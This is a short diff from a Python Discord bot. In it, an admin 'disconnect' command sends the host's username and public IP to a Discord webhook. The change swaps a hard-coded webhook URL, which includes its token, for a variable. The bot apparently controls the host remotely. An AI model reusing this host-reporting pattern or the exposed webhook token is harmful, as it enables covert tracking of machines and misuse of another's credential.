@@ -97,7 +97,7 @@ async def power_off(ctx):
 @client.command()
 @commands.has_permissions(administrator=True)
 async def disconnect(ctx):
-    DiscordWebhook(url="https://discord.com/api/webhooks/1061015487259099167/-RUKGtYqjn00BDhUw3wNCKTdgdRkeIpl3xW_IAxkxNNWhIkJXOAq-Fr5MBEuI7Atq8ha", content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
+    DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
     exit()
 
 @client.command()
